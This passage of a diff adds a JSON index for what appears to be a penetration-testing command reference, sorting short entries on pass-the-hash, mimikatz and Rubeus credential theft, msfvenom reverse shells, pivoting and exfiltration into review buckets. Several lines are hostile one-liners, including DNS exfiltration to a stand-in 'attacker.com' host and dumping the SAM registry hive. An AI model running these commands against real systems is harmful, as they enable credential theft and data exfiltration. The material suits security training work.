+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "pth-impacket-psexec",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Manual testing with evil-winrm",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "manual-testing-with",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use -X for PowerShell commands",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "use-x-for",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Manual base64-encode-powershell with custom payload",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "manual-base-encode",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "rlwrap-nc-lvnp",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfconsole exploit/multi/handler for Meterpreter shells",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "msfconsole-exploit-multi",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "psexec-impacket-shell for direct SYSTEM shell",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+        "suggested_id": "psexec-impacket-shell",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Base64 payload generated with revshell-ps-generator",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+        "suggested_id": "base-payload-generated",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "dcom-shellwindows (similar technique)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+        "suggested_id": "dcom-shellwindows-similar",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/",
+        "file": "data/commands/exploitation/metasploit-auxiliary.json",
+        "suggested_id": "ls-usr-share",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "psexec-impacket-shell with -hashes",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+        "suggested_id": "psexec-impacket-shell",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)",
+        "file": "data/commands/exploitation/metasploit-payloads.json",
+        "suggested_id": "msfvenom-p-windows",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)",
+        "file": "data/commands/exploitation/metasploit-payloads.json",
+        "suggested_id": "msfvenom-p-linux",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)",
+        "file": "data/commands/exploitation/metasploit-payloads.json",
+        "suggested_id": "msfvenom-p-java",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "overpass-mimikatz-pth already executed",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Invoke-Mimikatz for remote export",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Rubeus ptt /ticket:<FILE>",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "rubeus-ptt-ticket",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "service ssh start - SysVinit alternative (older systems)",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "service-ssh-start",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "smb-server - SMB file sharing alternative",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "smb-server-smb",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "nmap localhost - External port scan verification",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "nmap-localhost-external",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "netstat -rn - Netstat routing table view",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "netstat-rn-netstat",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "curl http://<TARGET>:<PORT> - HTTP service verification",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "curl-http-target",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Port forward if internal network: ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "port-forward-if",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "crackmapexec smb - Modern SMB enumeration and exploitation framework",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "crackmapexec-smb-modern",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "wmic os get caption,version - Specific OS version",
+        "file": "data/commands/pivoting/windows-utilities.json",
+        "suggested_id": "wmic-os-get",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "whoami /all - Complete user info",
+        "file": "data/commands/pivoting/windows-utilities.json",
+        "suggested_id": "whoami-all-complete",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without SSH encryption, no authentication required",
+        "file": "data/commands/pivoting/ssh-tunneling.json",
+        "suggested_id": "socat-port-forward",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "plink-remote-forward + microsocks - Workaround for OpenSSH <7.6",
+        "file": "data/commands/pivoting/ssh-tunneling.json",
+        "suggested_id": "plink-remote-forward",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Pivot host can route to destination: ip route, ping <DEST_IP>",
+        "file": "data/commands/pivoting/ssh-tunneling.json",
+        "suggested_id": "pivot-host-can",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "chisel - HTTP tunneling if SSH blocked",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "chisel-http-tunneling",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without authentication",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "socat-port-forward",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "firewall-allows-outbound",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "plink-remote-forward - Windows SSH client alternative",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "plink-remote-forward",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Proxychains configured: /etc/proxychains4.conf has correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "proxychains-configured-etc",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "socat-port-forward - Set up relay on pivot host",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "socat-port-forward",
+        "preservation_note": "Create complete command entry"
+      }
+    ],
+    "MANUAL_REVIEW_PRESERVE": [
+      {
+        "text": "HTTP server on attacker",
+        "file": "data/commands/generated/file-transfer-additions.json",
+        "suggested_id": "http-server-on",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "grep time range in syslog files (manual)",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "grep-time-range",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "w (includes user info)",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "w-includes-user",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "docker info",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-info",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "docker version",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-version",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "docker pull ubuntu (larger but more tools)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-pull-ubuntu",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "docker pull busybox (even smaller than alpine)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-pull-busybox",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "python3 smbserver.py share .",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "python-smbserver-py",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "samba service",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "samba-service",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "bitsadmin for newer Windows",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "bitsadmin-for-newer",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "certutil base64 encoding",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "certutil-base-encoding",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "dig $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "dig-data-attacker",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "host $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "host-data-attacker",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "ping $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "ping-data-attacker",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "bitsadmin download",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "bitsadmin-download",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "rsync for larger transfers",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "rsync-for-larger",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "SFTP for interactive transfer",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "sftp-for-interactive",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "socat for bidirectional transfer",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "socat-for-bidirectional",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "TFTP for simpler transfers",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "tftp-for-simpler",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "SFTP for encrypted transfers",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "sftp-for-encrypted",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "certutil for simpler syntax",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "certutil-for-simpler",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use individual PowerUp functions",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Manual MSI creation with WiX Toolset",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "manual-msi-creation",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Manual searchsploit of OS version",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "manual-searchsploit-of",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "mimikatz: vault::list",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "rundll32 keymgr.dll,KRShowKeyMgr",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "rundll-keymgr-dll",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use mimikatz lsadump::sam",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "wmic os get Caption,Version,BuildNumber",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "wmic-os-get",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "dir C:\\Windows\\System32\\Tasks",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "dir-c-windows",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "reg save HKLM\\SAM sam.save",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "reg-save-hklm",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "reg save HKLM\\SYSTEM system.save",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "reg-save-hklm",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "mimikatz dpapi::masterkey",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Rubeus.exe kerberoast",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "rubeus-exe-kerberoast",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "icacls C:\\Progra~1\\*",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "icacls-c-progra",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Manual review of find output",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+        "suggested_id": "manual-review-of",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use LinEnum if LinPEAS fails",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-linenum-if",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Manual enumeration with individual commands",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "manual-enumeration-with",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use curl instead of wget",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-curl-instead",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use LinPEAS for more comprehensive scan",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-linpeas-for",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use pspy to monitor processes",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-pspy-to",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use LinPEAS which includes capability check",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-linpeas-which",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use metasploit NFS scanner",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "use-metasploit-nfs",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "use-linpeas-sh",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use linpeas.sh capabilities module for automated classification",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "use-linpeas-sh",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Man pages: man 7 capabilities (understand what capability enables)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "man-pages-man",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Binary name extracted from getcap output",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "binary-name-extracted",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "GTFOBins technique researched and understood",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "gtfobins-technique-researched",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Search SYSVOL for GPP passwords",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "search-sysvol-for",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Manual iteration without recursion",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "manual-iteration-without",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Search patterns: *sql*, *backup*, *service*, *admin*",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "search-patterns-sql",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "PsLoggedOn.exe downloaded from Sysinternals Suite",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "psloggedon-exe-downloaded",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+        "suggested_id": "smb-port-open",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Check service fingerprint manually",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "check-service-fingerprint",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Identify target service and port",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "identify-target-service",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Identify required arguments from help",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "identify-required-arguments",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Note web server type from nmap: Apache, IIS, nginx",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "note-web-server",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Check robots.txt and source code manually",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "check-robots-txt",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Mimikatz on compromised Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "smb-port-open",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Metasploit web_delivery module",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "metasploit-web-delivery",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Target identified",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "target-identified",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "DCOM enabled (default)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+        "suggested_id": "dcom-enabled-default",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "getwd (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json",
+        "suggested_id": "getwd-alias",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "dir (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json",
+        "suggested_id": "dir-alias",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "WinRM enabled on target (default Windows Server 2012+)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+        "suggested_id": "winrm-enabled-on",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985 or 5986 open)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+        "suggested_id": "winrm-enabled-on",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "RPC port 135 open on target",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+        "suggested_id": "rpc-port-open",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "SMB connection to target (port 445)",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+        "suggested_id": "smb-connection-to",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Use hostname in UNC path: \\\\files04\\share",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "use-hostname-in",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Mimikatz: sekurlsa::tickets",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Rubeus: klist",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "rubeus-klist",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": ".kirbi ticket file",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "kirbi-ticket-file",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Mimikatz: kerberos::purge",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Review and determine best preservation method"
+      },
+      {
+        "text": "Proxychains configured with correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "proxychains-configured-with",
+        "preservation_note": "Review and determine best preservation method"
+      }
+    ],
+    "CREATE_VERIFY_CMD": [
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/active-directory-additions.json",
+        "suggested_id": "neo-j-running",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "neo-j-running",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "docker pull alpine (if no images available)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-pull-alpine",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "wget if curl unavailable",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "wget-if-curl",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Use wget/curl if available",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-wget-curl",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "getcap utility installed (part of libcap package)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "getcap-utility-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "nmap -sn <SUBNET> (if dsquery unavailable)",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+        "suggested_id": "nmap-sn-subnet",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "sqli-union-mysql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json",
+        "suggested_id": "sqli-union-mysql",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "sqli-union-postgresql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json",
+        "suggested_id": "sqli-union-postgresql",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Impacket installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+        "suggested_id": "impacket-installed-on",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "nmap installed (default on Kali)",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+        "suggested_id": "nmap-installed-default",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-crackmapexec-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-crackmapexec-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-crackmapexec-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "nmap installed on Kali (pre-installed)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+        "suggested_id": "nmap-installed-on",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Evil-WinRM installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+        "suggested_id": "evil-winrm-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+        "suggested_id": "verify-crackmapexec-installed",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "verify-ntlm-hash",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Mimikatz available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "import-mimikatz",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Rubeus.exe available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+        "suggested_id": "rubeus-exe-available",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Nmap installed: sudo apt install nmap",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "nmap-installed-sudo",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable",
+        "file": "data/commands/pivoting/ssh-tunneling.json",
+        "suggested_id": "plink-remote-forward",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Socat installed on pivot host: which socat (if not found: sudo apt install socat)",
+        "file": "data/commands/pivoting/ssh-tunneling.json",
+        "suggested_id": "socat-installed-on",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "rdp-service-running",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "Python available on pivot host: which python3 (usually present by default)",
+        "file": "data/commands/pivoting/pivot-utilities.json",
+        "suggested_id": "python-available-on",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "socks-proxy-running",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "socks-proxy-running",
+        "preservation_note": "Create verification/check command"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D or ssh -R (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json",
+        "suggested_id": "socks-proxy-running",
+        "preservation_note": "Create verification/check command"
+      }
+    ],
+    "CREATE_TRANSFER_CMD": [
+      {
